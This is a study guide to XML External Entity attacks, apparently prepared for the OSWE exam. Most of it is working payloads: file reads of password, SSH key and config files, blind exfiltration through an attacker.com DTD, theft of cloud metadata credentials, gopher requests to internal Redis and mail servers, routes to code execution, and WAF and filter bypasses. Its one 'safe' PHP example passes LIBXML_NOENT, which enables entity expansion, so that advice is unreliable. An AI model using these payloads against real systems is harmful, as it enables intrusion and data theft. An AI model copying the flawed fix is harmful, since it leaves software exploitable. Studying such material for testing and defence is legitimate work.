# XXE (XML External Entity) Attack Vectors Guide

## Overview
XML External Entity (XXE) attacks exploit XML parsers that process external entity references. This allows attackers to read local files, perform SSRF, cause denial of service, and in some cases achieve RCE.

## Part 1: XXE Fundamentals

### XML Entity Basics
```xml
<!-- Internal entity -->
<!DOCTYPE foo [<!ENTITY myentity "my value">]>
<root>&myentity;</root>

<!-- External entity -->
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>

<!-- Parameter entity -->
<!DOCTYPE foo [<!ENTITY % myparameterentity "my value">]>
```

### Vulnerable Parser Configurations

**PHP (libxml)**:
```php
// VULNERABLE - External entities enabled (default)
$dom = new DOMDocument();
$dom->loadXML($xml);

// SAFE - External entities disabled
libxml_disable_entity_loader(true);
$dom->loadXML($xml, LIBXML_NOENT);
```

**Java**:
```java
// VULNERABLE
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
DocumentBuilder db = dbf.newDocumentBuilder();
Document doc = db.parse(new InputSource(new StringReader(xml)));

// SAFE
dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
```

**.NET**:
```csharp
// VULNERABLE
XmlDocument xmlDoc = new XmlDocument();
xmlDoc.XmlResolver = new XmlUrlResolver(); // External entities allowed
xmlDoc.LoadXml(xml);

// SAFE
xmlDoc.XmlResolver = null; // Disable external entities
```

## Part 2: Attack Types

### Type 1: In-Band File Read (Classic XXE)

**Basic Payload**:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>
  <data>&xxe;</data>
</root>
```

**Reading Windows Files**:
```xml
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]>
<root>&xxe;</root>
```

**PHP Wrapper for Base64 Encoding**:
```xml
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]>
<root>&xxe;</root>
```

### Type 2: Out-of-Band XXE (Blind XXE)

**External DTD Method**:
```xml
<!-- 1. Initial request to target -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd"> %xxe;]>
<root><data>test</data></root>

<!-- 2. evil.dtd on attacker server -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://attacker.com/?data=%file;'>">
%eval;
%exfiltrate;
```

**Single-Line OOB**:
```xml
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/?data=exfiltrated">]>
<root>&xxe;</root>
```

### Type 3: Error-Based XXE

**Force XML Parser Error**:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
  %eval;
  %error;
]>
<root>test</root>
```

**Benefits**: File contents appear in error message when external DTD not allowed

### Type 4: SSRF via XXE

**Internal Network Scan**:
```xml
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://192.168.1.1:80">]>
<root>&xxe;</root>
```

**Cloud Metadata Extraction (AWS)**:
```xml
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">]>
<root>&xxe;</root>
```

**Gopher Protocol for SMTP/HTTP**:
```xml
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "gopher://internal-server:25/_MAIL%20FROM:attacker@evil.com">]>
<root>&xxe;</root>
```

## Part 3: Advanced Techniques

### UTF-7 Encoding Bypass

```xml
<?xml version="1.0" encoding="UTF-7"?>
+ADw-+ACE-DOCTYPE foo+AFs-+ADw-+ACE-ENTITY xxe SYSTEM +ACI-file:///etc/passwd+ACI +AD4-+AF0-+AD4-
<root>&xxe;</root>
```

### XML Parameter Entity Injection

```xml
<!DOCTYPE foo [
  <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
  %dtd;
]>
<root>&send;</root>
```

### XXE in SOAP Requests

```xml
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
  <soap:Body>
    <login>
      <username>&xxe;</username>
      <password>test</password>
    </login>
  </soap:Body>
</soap:Envelope>
```

### XXE in SVG Files

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/hostname">]>
<svg xmlns="http://www.w3.org/2000/svg">
  <text>&xxe;</text>
</svg>
```

### XXE in Microsoft Office Files

**DOCX (word/document.xml)**:
```xml
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE test [<!ENTITY xxe SYSTEM "http://attacker.com/">]>
<w:document>
  <w:body>
    <w:p><w:r><w:t>&xxe;</w:t></w:r></w:p>
  </w:body>
</w:document>
```

**XLSX (xl/workbook.xml)**:
```xml
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<workbook>
  <sheet>&xxe;</sheet>
</workbook>
```

## Part 4: XXE to RCE

### Expect Protocol (PHP)

```xml
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://id">]>
<root>&xxe;</root>
```

**Requirements**: PHP `expect://` extension enabled (rare)

### Java JAR Protocol

```xml
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "jar:http://attacker.com/evil.jar!/">]>
<root>&xxe;</root>
```

**evil.jar**: Can contain malicious classes triggering RCE on deserialization

### XXE + SSRF to RCE

**Exploit Internal Services**:
```xml
<!-- Exploit internal Redis -->
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "gopher://localhost:6379/_CONFIG%20SET%20dir%20/var/www/html">]>
<root>&xxe;</root>
```

## Part 5: Protocol Handlers

### Common Protocols

| Protocol | Use Case | Example |
|----------|----------|---------|
| `file://` | Local file access | `file:///etc/passwd` |
| `http://` | Remote resources | `http://attacker.com/dtd` |
| `https://` | Secure remote | `https://attacker.com/dtd` |
| `ftp://` | FTP access | `ftp://ftp.example.com/file` |
| `php://` | PHP wrappers | `php://filter/resource=/etc/passwd` |
| `expect://` | Command execution | `expect://id` |
| `data://` | Data URI | `data://text/plain,base64,PD9waHA...` |
| `gopher://` | Raw TCP | `gopher://localhost:25/_...` |

### Platform-Specific Protocols

**Java**:
- `jar://` - JAR file access
- `netdoc://` - Java network document (older versions)

**Windows**:
- `file:///c:/windows/win.ini` - Windows path format
- `\\\\UNC\\path\\file` - UNC paths (NTLM hash leak)

## Part 6: OSWE Exam Strategy

### Recon Checklist (5 minutes)
- [ ] Identify XML input points (file upload, API endpoints, SOAP)
- [ ] Check for XML content-type headers
- [ ] Test with simple entity payload
- [ ] Check parser error messages for clues

### Exploitation Workflow (15 minutes)

**1. Test for Basic XXE** (3 min):
```xml
<!DOCTYPE foo [<!ENTITY test "SUCCESS">]>
<root>&test;</root>
```

**2. Attempt File Read** (5 min):
```xml
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>
```

**3. Try OOB if Blind** (7 min):
- Set up HTTP listener: `python3 -m http.server 80`
- Send OOB payload with external DTD
- Check listener for callback

### Time-Saving Tips
- Use `poc-examples/xxe-file-read-ssrf/poc.py` skeleton
- Test common files first: `/etc/passwd`, `C:\Windows\win.ini`, `web.config`
- For blind XXE, use Burp Collaborator or `payload_server.py`
- Check SOAP endpoints - often have XXE vulnerabilities

### Common Exam Targets

**Linux Files**:
```
/etc/passwd          # User list
/etc/shadow          # Password hashes (if root)
/var/www/html/config.php
/home/user/.ssh/id_rsa
/proc/self/environ   # Environment variables
```

**Windows Files**:
```
C:\Windows\win.ini
C:\inetpub\wwwroot\web.config
C:\Users\Administrator\.ssh\id_rsa
```

**Application Config**:
```
/var/www/html/.env
/opt/app/config.yml
web.config
application.properties
```

## Part 7: Bypass Techniques

### WAF Bypasses

**Encoding**:
```xml
<!-- URL encoding -->
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file%3a%2f%2f%2fetc%2fpasswd">]>

<!-- HTML entities -->
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "&#x66;ile:///etc/passwd">]>
```

**Case Variation**:
```xml
<!DoCtYpE foo [<!EnTiTy xxe SYSTEM "file:///etc/passwd">]>
```

### Filter Evasion

**Keyword Blacklist Bypass**:
```xml
<!-- If "SYSTEM" blocked, use PUBLIC -->
<!DOCTYPE foo [<!ENTITY xxe PUBLIC "any_text" "file:///etc/passwd">]>
```

**Newline/Tab Insertion**:
```xml
<!DOCTYPE	foo	[
<!ENTITY
xxe
SYSTEM
"file:///etc/passwd">
]>
```

## Part 8: Code Review Patterns

### Vulnerable Patterns

**PHP**:
```php
// DANGEROUS
simplexml_load_string($xml);
DOMDocument::loadXML($xml);
XMLReader::XML($xml);
```

**Java**:
```java
// DANGEROUS
DocumentBuilderFactory.newInstance().newDocumentBuilder().parse(input);
SAXParserFactory.newInstance().newSAXParser().parse(input, handler);
XMLInputFactory.newInstance().createXMLStreamReader(input);
```

**.NET**:
```csharp
// DANGEROUS
XmlDocument.LoadXml(xml);
XmlTextReader.Read();
XPathNavigator.Evaluate(xpath);
```

### Quick Grep Commands

```bash
# Find XML parsing
grep -r "loadXML\|simplexml_load" .
grep -r "DocumentBuilder\|SAXParser" .
grep -r "XmlDocument\|XmlTextReader" .

# Find file read sinks
grep -r "file_get_contents\|fopen" .
grep -r "FileInputStream\|FileReader" .
grep -r "File.ReadAllText\|StreamReader" .
```

## References
- OWASP XXE: https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing
- PortSwigger: https://portswigger.net/web-security/xxe
- PayloadsAllTheThings: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection
